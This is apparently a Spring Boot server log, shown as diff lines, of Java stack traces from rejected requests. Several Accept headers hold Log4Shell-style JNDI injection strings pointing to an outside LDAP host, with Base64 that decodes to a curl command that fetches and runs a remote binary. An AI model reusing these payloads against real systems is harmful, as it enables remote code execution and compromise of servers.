+	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:158) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:710) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:459) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:384) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:312) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:398) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:257) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:179) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-03 23:32:58.985  WARN 8250 --- [nio-8081-exec-1] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpMediaTypeNotAcceptableException: Could not parse 'Accept' header [${jndi:ldap://89.163.206.163:1389/Basic/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}]: Invalid mime type "${jndi:ldap://89.163.206.163:1389/Basic/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}": Invalid token character '{' in token "${jndi:ldap:"]
+2022-02-03 23:32:59.231  WARN 8250 --- [nio-8081-exec-6] .m.m.a.ExceptionHandlerExceptionResolver : Failure in @ExceptionHandler org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#mediaTypeNotAcceptable(HttpServletRequest)
+
+org.springframework.web.HttpMediaTypeNotAcceptableException: Could not parse 'Accept' header [${jndi:ldap://89.163.206.163:1389/Basic/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}]: Invalid mime type "${jndi:ldap://89.163.206.163:1389/Basic/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}": Invalid token character '{' in token "${jndi:ldap:"
+	at org.springframework.web.accept.HeaderContentNegotiationStrategy.resolveMediaTypes(HeaderContentNegotiationStrategy.java:59) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.accept.ContentNegotiationManager.resolveMediaTypes(ContentNegotiationManager.java:128) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.getAcceptableMediaTypes(AbstractMessageConverterMethodProcessor.java:386) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:216) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.HttpEntityMethodProcessor.handleReturnValue(HttpEntityMethodProcessor.java:219) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:82) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:123) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver.doResolveHandlerMethodException(ExceptionHandlerExceptionResolver.java:407) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.AbstractHandlerMethodExceptionResolver.doResolveException(AbstractHandlerMethodExceptionResolver.java:61) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.AbstractHandlerExceptionResolver.resolveException(AbstractHandlerExceptionResolver.java:141) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.HandlerExceptionResolverComposite.resolveException(HandlerExceptionResolverComposite.java:80) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.processHandlerException(DispatcherServlet.java:1300) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1111) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1057) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:90) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:118) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:84) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:158) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:710) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:459) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:384) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:312) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:398) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:257) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:179) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-03 23:32:59.231  WARN 8250 --- [nio-8081-exec-6] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpMediaTypeNotAcceptableException: Could not parse 'Accept' header [${jndi:ldap://89.163.206.163:1389/Basic/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}]: Invalid mime type "${jndi:ldap://89.163.206.163:1389/Basic/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}": Invalid token character '{' in token "${jndi:ldap:"]
+2022-02-03 23:32:59.480  WARN 8250 --- [nio-8081-exec-9] .m.m.a.ExceptionHandlerExceptionResolver : Failure in @ExceptionHandler org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#mediaTypeNotAcceptable(HttpServletRequest)
+
+org.springframework.web.HttpMediaTypeNotAcceptableException: Could not parse 'Accept' header [${jndi:ldap://89.163.206.163:1389/TomcatBypass/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}]: Invalid mime type "${jndi:ldap://89.163.206.163:1389/TomcatBypass/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}": Invalid token character '{' in token "${jndi:ldap:"
+	at org.springframework.web.accept.HeaderContentNegotiationStrategy.resolveMediaTypes(HeaderContentNegotiationStrategy.java:59) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.accept.ContentNegotiationManager.resolveMediaTypes(ContentNegotiationManager.java:128) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.getAcceptableMediaTypes(AbstractMessageConverterMethodProcessor.java:386) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:216) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.HttpEntityMethodProcessor.handleReturnValue(HttpEntityMethodProcessor.java:219) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:82) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:123) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver.doResolveHandlerMethodException(ExceptionHandlerExceptionResolver.java:407) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.AbstractHandlerMethodExceptionResolver.doResolveException(AbstractHandlerMethodExceptionResolver.java:61) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.AbstractHandlerExceptionResolver.resolveException(AbstractHandlerExceptionResolver.java:141) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.HandlerExceptionResolverComposite.resolveException(HandlerExceptionResolverComposite.java:80) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.processHandlerException(DispatcherServlet.java:1300) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1111) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1057) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:90) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:118) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:84) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:158) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
